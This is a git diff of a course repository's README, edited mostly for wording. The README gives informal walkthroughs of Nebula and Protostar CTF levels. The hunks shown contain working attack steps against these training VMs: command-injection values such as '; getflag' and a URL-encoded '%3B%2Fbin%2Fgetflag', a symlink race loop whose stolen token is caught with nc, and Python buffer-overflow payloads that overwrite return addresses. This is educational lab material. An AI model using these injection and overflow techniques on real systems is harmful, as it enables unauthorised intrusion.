@@ -1,9 +1,9 @@
 # SECPROG-Unisa
 Solutions for Nebula and Protostar CTFs for the Secure Programming course of the Master's Degree in Cybersecurity of Unisa.
 
-This repository aims to provide straightforward and simple EXPLAINATIONS on how to solve Nebula and Protostar CTFs shown during the Secure Programming Course of the Master's Degree in Cybersecurity of Unisa. I'm not just leaving a script, I'm explaining what the hell I am doing.
+This repository aims to provide straightforward and simple EXPLANATIONS for solving Nebula and Protostar CTFs presented during the Secure Programming Course of the Master's Degree in Cybersecurity of Unisa. I'm not just dropping a script, I'm explaining what the hell I'm doing.
 
-Beware: I'm really informal here, and I'm not interested in sounding professional. If you're sensible to slurs, slangs and shit, just go away and study somewhere else. If you are an HR, this is not my CV. Take this file as a "friendly yapping about CTFs".
+Beware: I'm really informal here, and I'm not interested in sounding professional. If you're sensitive to slurs, slang and shit, just go away and study somewhere else. If you are an HR, this is not my CV. Take this file as a "friendly yapping about CTFs".
 
 In this course, these CTFs were solved:
 - nebula-level00;
@@ -30,7 +30,7 @@ Alternatively, look at the find man page.
 
 To access this level, log in as level00 with the password of level00.
 
-So let's log in as level00. We can use `find` with the right parameters to search for an SUID executable.
+So let's log in as level00. We can use the `find` command with appropriate parameters to search for an SUID executable.
 
 ```
 level00@nebula:~$ find / -perm /u+s 2>/dev/null
@@ -101,23 +101,23 @@ and now what?
 
 Nothing happens.
 
-Examining the source code we can find something interesting.
+Examining the source code we can notice something interesting.
 
 ```
 system("/usr/bin/env echo and now what?");
 ```
 
-Let's perform a quick `man system`.
+Let's have a glance at the `man system` entry:.
 
 "system()  executes  a  command specified in command by calling /bin/sh -c command, and returns after the command has  been  completed."
 
-We also find an interesting bit into the NOTES section:
+Reading further, the NOTES sections reveals something pretty interesting:
 
 "Do  not  use  system()  from  a  program  with set-user-ID or set-group-ID privileges, because strange values for some environment variables might be used to subvert  system integrity."
 
 So what environment variable can we use to get freaky?
 
-Actually, when you use a command without giving the full path of the executable, the `PATH` variable is used to search for such command in these paths.
+Actually, when using a command without giving the full path of the executable, the `PATH` variable is used to search for such command in these paths.
 
 In our program the `echo` command is called in such way.
 
@@ -184,7 +184,7 @@ The command is `/bin/echo USER is cool` where `USER` is the content of the `USER
 
 We can't leverage the solution of Level 01 because `echo` is called using its absolute path, but we can do something else.
 
-We can modify the `USER` environment variable making it `; getflag`. This way the `system` will call `getflag`.
+We can modify the USER variable to inject a command. If we set it to `; getflag`, the resulting system command will execute getflag after the semicolon.
 
 Let's try it:
 
@@ -240,7 +240,7 @@ int main(int argc, char **argv, char **envp)
 }
 ```
 
-First thing first, let's log in as level04 and check the content of `/home/flag04/flag04`:
+First things first, let's log in as level04 and check the content of `/home/flag04/flag04`:
 
 ```
 level04@nebula:/home/flag04$ ls -la
@@ -264,13 +264,13 @@ We got an error. Analyzing the source code, we can't read the file because its n
 
 Let's read the manual of `open`:
 
-"Given  a  pathname  for a file, open() returns a file descriptor".
+"Given a pathname  for a file, open() returns a file descriptor".
 
 No shit Sherlock. But actually that's a fair point, because if we read further:
 
 "**O_NOFOLLOW** If pathname is a symbolic link, then the open fails".
 
-Our `open` does not use the `O_NONFOLLOW` option, does that mean we can open a symlink?
+Our `open` does not use the `O_NONFOLLOW` option. That means we can open a symlink?
 
 Let's create a link to the `token` file and let's use it as argument for `./flag04`:
 
@@ -379,7 +379,7 @@ PORT     STATE SERVICE
 ...
 ```
 
-We do! Something is open on port 7007.
+We do! Port 7007 is open.
 
 Checking the content of `thttpd.conf`, we can notice an interesting line:
 
@@ -396,7 +396,7 @@ Let's check the ASCII encoding for ";" and "/":
 - ; -> 3B
 - / -> 2F
 
-So the string should be something similar:
+So the string should look like this:
 
 `GET index.cgi?Host=8.8.8.8%3B%2Fbin%2Fgetflag`
 
@@ -558,7 +558,7 @@ do
 done &
 ```
 
-Actually we can also write is as a one-liner:
+We can also write it as a one-liner:
 
 ```
 while true; do ln -sf /home/flag10/token /tmp/link; ln -sf /tmp/faketoken /tmp/link; done &
@@ -582,7 +582,7 @@ while true; do /home/flag10/flag10 /tmp/link 192.168.56.1; done
 
 Let's run `nc -lvnp 18211` on the helper terminal again, then we can run the attack:
 
-I wasn't able to catch the moment where the file is sent on the host machine, but on the helper terminal we can surely check the attack was successful:
+I wasn't able to catch the moment where the file is sent on the host machine, but on the helper terminal we can clearly check the attack was successful:
 
 ```
 nc -lvnp 18211
@@ -686,7 +686,7 @@ Success.
 ## Protostar
 
 ### Before we start...
-Let's check the machine OS and architecture since we'll work with memory and shit:
+Let’s check the machine’s OS and architecture since we’ll be working with memory and shit:
 
 ```
 user@protostar:~$ lsb_release -a
@@ -699,7 +699,7 @@ user@protostar:~$ arch
 i686
 ```
 
-We're on Debian 6.0.3 and the machine runs at 32 bit. Nice to know.
+We're on Debian 6.0.3 and the machine is 32-bit. Nice to know.
 
 ### Stack 0
 
@@ -730,20 +730,20 @@ int main(int argc, char **argv)
 
 To solve this level we have to override the content of `modified` variable.
 
-Analyzing the source code, we notice the usage of `gets()`. This function is notoriously insecure, but let's read its `man` entry anyway:
+From analyzing the source code, we notice the use of `gets()`. This function is notoriously insecure, but let's read its `man` entry anyway:
 
 "Never use gets().  Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past  the  end of  the  buffer, it is extremely dangerous to use.  It has been used to break computer security".
 
-Basically if this function is used, a buffer overflow attack is feasible.
+Basically, if this function is used, then a buffer overflow attack is feasible.
 
-We have to check if the `buffer` and `modified` variables are in contiguous memory regions.
+We have to check whether the `buffer` and `modified` variables are in contiguous memory regions.
 
-Actually, we can assume they do because of how the stack works on Linux systems. 
+In fact, we can assume they do because of how the stack works on Linux systems. 
 Variables are pushed on top of the stack in the declaration order. On our program `modified` is declared before `buffer`.
 
 So if we override 65 bytes starting from the base address of `buffer`, we're overriding `modified`.
 
-We just have to provide 65 characters to `./stack0`. I will use a simple python script to accomplis so because I'm not a subhuman and I will not count 65 character by hand:
+We just have to provide 65 characters to `./stack0`. I will use a simple Python script to accomplish this because I'm not a subhuman and I will not count 65 characters by hand:
 
 ```
 user@protostar:/opt/protostar/bin$ python -c "print('a'*65)" | /opt/protostar/bin/stack0
@@ -788,24 +788,24 @@ int main(int argc, char **argv)
 }
 ```
 
-This time we have to override `modified` with a certain value. The source code suggests us this value: `0x61626364`.
+This time we have to override `modified` with a certain value. The source code suggests this value to us: `0x61626364`.
 
-But wtf is that? If you're not a script kiddie you would know it's hexadecimal.
+But what the heck is that? If you're not a script kiddie, you would know it's hexadecimal.
 
-Let's read the `man ascii` entry to know which char are these:
+Let's read the `man ascii` entry to know which char these are:
 - 0x61 -> "a"
 - 0x62 -> "b"
-- you got the point...
+- you get the point...
 
 So we have to input `abcd` into `modified`.
 
 How tf are we going to accomplish it without a `gets()`?
 
-Actually this program uses the `strcpy()` function, that still doesn't check the size of the destination memory.
+Actually this program uses the `strcpy()` function, which still doesn't check the size of the destination buffer.
 
 So if `argv[1]` is 65 bytes and `buffer` is 64 bytes, it will still copy 65 bytes.
 
-Anyway, if we're just going to put `abcd` into the variable, we would miserably fail, because Protostar is little endian. We have to reverse it (if it's not clear, it's `dcba`).
+Anyway, if we're just going to put `abcd` into the variable, we would miserably fail, because Protostar is little endian. e have to reverse it; if it's not clear, the value should be `dcba`.
 
 Let's perform the attack:
 
@@ -853,11 +853,11 @@ int main(int argc, char **argv)
 }
 ```
 
-This level is really stupid. You still have the `strcpy()` bug, and the `modified` variable has to be overwritten with `0x0d0a0d0a`.
+This level is really stupid. You still have the insecure `strcpy()`, and the `modified` variable needs to be overwritten with `0x0d0a0d0a`.
 
-To solve this one, just `export GREENIE`. Its content will be copied into the buffer without paying attention to both the variable size and the buffer size.
+To solve this one, simply `export GREENIE`. Its content will be copied into the buffer without any bounds checking.
 
-The buffer is still 64 bytes, and we can just put the hex into the script. We still have to pay attention to the order of the bytes, since Protostar is still little endian.
+Since the buffer is 64 bytes, you can provide the required bytes in a script. Remember to consider the byte order because Protostar is little endian.
 
 ```
 user@protostar:/opt/protostar/bin$ export GREENIE=`python -c "print('a'*64 + '\x0a\x0d\x0a\x0d')"`
@@ -903,11 +903,11 @@ int main(int argc, char **argv)
 }
 ```
 
-This level is basically a dumb version of return address overwriting.
+This level is essentially a dumb version of return address overwriting.
 
 The `gets()` function allows us to perform a buffer overflow.
 
-We have a function pointer `fp` adjacent to `buffer`. We just have to lookup where `win()` is located in memory with `gdb` and then put its address into `fp`:
+We have a function pointer fp adjacent to buffer. We need to find where win() is located in memory, which we can do using gdb. Once we have the address, we overwrite fp with it:
 
 ```
 user@protostar:/opt/protostar/bin$ gdb -q ./stack3
@@ -916,7 +916,7 @@ Reading symbols from /opt/protostar/bin/stack3...done.
 $1 = {void (void)} 0x8048424 <win>
 ```
 
-So the `win()` function is located at `0x8048424`. Now we can use the script we used countless times, writing this address in little endian:
+So the `win()` function is located at `0x8048424`. Now we can use the same technique we've used before, writing this address in little endian format:
 
 ```
 user@protostar:/opt/protostar/bin$ python -c "print('a'*64 + '\x24\x84\x04\x08')" | ./stack3
@@ -956,11 +956,11 @@ int main(int argc, char **argv)
 }
 ```
 
-This time the only variable declared into the main is `buffer`, and the win condition is still do change the code flow.
+This time the only variable declared in the main is `buffer`, and the win condition is still to change the code flow.
 
-We don't have a function pointer or similar stuff, so we have to break things in another way.
+We don't have a function pointer or similar tricks this time, so we'll have to break things in another way.
 
-Let's have a look at how the stack works on Protostar, and what the main does. A knowledge of assembly is needed here:
+Let's look at how the stack works on Protostar, and what the main does. Some knowledge of assembly is needed here:
 
 ```
 user@protostar:/opt/protostar/bin$ gdb -q stack4
@@ -979,15 +979,15 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
-- Before the main the return address to `__libc_start_main` is pushed on the stack; 
-- Then the main is called;
-- The old base frame pointer (`ebp`) is pushed on the stack;
-- The `ebp` is updated at the current stack top (`esp`);
-- A padding is applied because of the Intel standard;
+- Before the main the return address to `__libc_start_main` is pushed onto the stack; 
+- The main is called;
+- The old base frame pointer (`ebp`) is pushed onto the stack;
+- `ebp` is updated to the current stack top (`esp`);
+- A padding is applied due to Intel's convention;
 - 80 bytes (`0x50`) of memory are allocated;
 - The address of the buffer is calculated starting from the top of the stack (note that 16 + 64 = 80);
-- the address of the buffer is put on top of the stack (not pushed!);
-- `gets()` is called, and after that the main returns.
+- the address of the buffer is moved onto top of the stack (not pushed!);
+- `gets()` is called, and afterward, the main returns.
 
 So the stack should look something like this:
 
@@ -999,14 +999,14 @@ So the stack should look something like this:
 
 Since we can write into the buffer, to reach the return addres we have to provide 64 + 8 + 4 = 76 bytes of padding before writing the address we want to jump to.
 
-Let's just get the address of `win()` once again:
+Let's just find the address of `win()` once again:
 
 ```
 (gdb) p win
 $1 = {void (void)} 0x80483f4 <win>
 ```
 
-Now we can use the same script we used for the past challenges:
+Now we can use the same script as in previous challenges:
 
 ```
 user@protostar:/opt/protostar/bin$ python -c "print('a'*76 + '\xf4\x83\x04\x08')" | ./stack4
